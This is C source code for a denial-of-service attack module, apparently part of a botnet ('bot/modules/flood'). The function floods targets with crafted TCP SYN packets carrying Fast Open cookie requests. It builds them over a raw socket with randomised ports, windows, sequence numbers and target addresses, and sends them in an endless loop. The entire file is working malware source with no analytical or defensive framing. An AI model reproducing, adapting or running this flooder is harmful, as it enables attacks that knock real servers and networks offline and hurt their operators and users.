#include <netinet/in.h>
#include <stdlib.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_tcptfo(pflood_context_t ctx) {
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    LOG_ERROR("allocating targets failed");
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    close(fd);
    exit(0);
  }

  uint16_t syn_len = sizeof(struct tcphdr) + 24;

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *iph = (struct iphdr *)packets[i];
    iph->version = IPVERSION;
    iph->ttl = IPDEFTTL;
    iph->protocol = IPPROTO_TCP;

    iph->id = xoshiro_next() & 0xFFFF;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + syn_len);
    iph->frag_off = htons(1 << 14);

    iph->daddr = target->address;
    iph->saddr = network_local_addr();

    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    tcph->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
    tcph->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 11;
    tcph->syn = 1;
    tcph->window = xoshiro_next() & 0xFFFF;
    tcph->urg_ptr = 0;
  }

  while (true) {
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];
      target_random_addr(target);

      struct iphdr *iph = (struct iphdr *)packets[i];
      struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
      uint8_t *options = (uint8_t *)(tcph + 1);

      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;

      // randomize window and sequence
      tcph->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      tcph->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      tcph->window = xoshiro_next() & 0xffff;
      tcph->seq = xoshiro_next() & 0xffff;

      // tcp options
      *options++ = TCP_OPT_MAX_SEG_SIZE;
      *options++ = 4; // Length
      *((uint16_t *)options) = htons(xoshiro_range(1300, 1460));
      options += sizeof(uint16_t);

      // SACK permitted option
      *options++ = TCP_OPT_SACK;
      *options++ = 2; // Length

      *options++ = TCP_OPT_TIMESTAMP;
      *options++ = 10;                         // Length
      *((uint32_t *)options) = xoshiro_next(); // TSVal
      options += sizeof(uint32_t);
      *((uint32_t *)options) = 0; // TSecr
      options += sizeof(uint32_t);

      *options++ = TCP_OPT_NO_OP;

      // TCP window scale
      *options++ = TCP_OPT_WINDOW_SCALING;
      *options++ = 3; // Length
      *options++ = 7; // Scale factor = 7 (2^7 = 128)

      *options++ = TCP_OPT_FASTOPEN; // Kind
      *options++ = 2;                // Length (Request for cookie)
      *options++ = TCP_OPT_NO_OP;
      *options++ = TCP_OPT_NO_OP;

      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      tcph->check = 0;
      tcph->check = checksum_tcpudp(iph, tcph, htons(syn_len), syn_len);

      sendto(fd, packets[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));
    }

    if (psleep > 0) usleep(psleep);
  }
}
